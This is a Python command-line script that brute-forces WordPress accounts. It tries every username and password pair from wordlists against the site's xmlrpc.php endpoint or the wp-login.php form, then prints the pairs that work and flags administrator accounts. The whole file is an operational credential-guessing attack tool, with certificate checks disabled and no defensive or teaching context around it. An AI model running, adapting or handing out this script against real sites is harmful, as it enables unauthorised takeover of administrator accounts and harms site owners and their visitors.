#!/usr/bin/python3

import requests
import argparse
import xml.etree.ElementTree as ET
import json

def info(string):
    if args.verbose:
        print(string.replace("\n",""))

def xml_rpc_api():
    for username in username_list:
        for password in password_list:
            data = f'<methodCall> \r\n<methodName>wp.getUsersBlogs</methodName> \r\n<params> \r\n<param><value>{username}</value></param> \r\n<param><value>{password}</value></param> \r\n</params> \r\n</methodCall>'
            r = s.post(args.url+'/xmlrpc.php', headers=headers, data=data, verify=False)
            if 'Incorrect username or password.' in r.text:
                info(f"[-] Tryed: {username} : {password}")
            else:
                msg = f"[+] Find: {username} : {password}"
                tree = ET.ElementTree(ET.fromstring(r.content))
                root = tree.getroot()
                #print([elem.text for elem in root.iter('name')][0])
                role = [elem.text for elem in root.iter('boolean')][0]
                if int(role) == 1:
                    msg += ' - is Administrator'
                print(msg.replace("\n",""))

def loginPage():
    for username in username_list:
        val = True
        for password in password_list:
            data = {
                'log':username,
                'pwd':password,
                'wp-submit':'Login In'
            }
            r = s.post(args.url+'/wp-login.php', headers=headers, data=data, verify=False)
            if 'dashboard' in r.text:
                msg = f"[+] Find: {username} : {password}"
                if 'plugins.php' in r.text:
                    msg += ' - is Administrator'
                print(msg.replace("\n",""))
            else:
                info(f"[-] Tryed: {username} : {password}")

def main():
    print("Running\n")
    if args.methode == 'xmlrpc':
        r = s.post(args.url+'/xmlrpc.php', headers=headers, verify=False)
        if r.status_code != 200:
            print('XML-RPC services are disabled on this site or url incorrect')
            exit(-1)
        xml_rpc_api()
    else:
        r = s.post(args.url+'/wp-login.php', headers=headers, verify=False)
        if r.status_code != 200:
            print('Login Page incorrect')   
            exit(-1)
        loginPage()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = '')
    group_user = parser.add_mutually_exclusive_group(required=True)
    group_password = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('--url', required=True, type=str)
    group_user.add_argument('-u', '--userlist', type=str)
    group_user.add_argument('-U', '--user', type=str)
    group_password.add_argument('-p', '--passwordlist', type=str)
    group_password.add_argument('-P', '--password', type=str)
    parser.add_argument('-m', '--methode', choices=['xmlrpc','loginpage'], type=str, default='loginpage',help='Choose xmlrpc or loginpage (=Default)')
    parser.add_argument('-v', '--verbose', action=argparse.BooleanOptionalAction, default=False)

    args = parser.parse_args()

    s = requests.session()
    if args.user:
        username_list = [args.user]
    elif args.userlist:
        f = open(args.userlist,"r")
        username_list = f.readlines()
    if args.password:
        password_list = [args.password]
    elif args.passwordlist:
        f = open(args.passwordlist,"r")
        password_list = f.readlines()

    headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
    }

    main()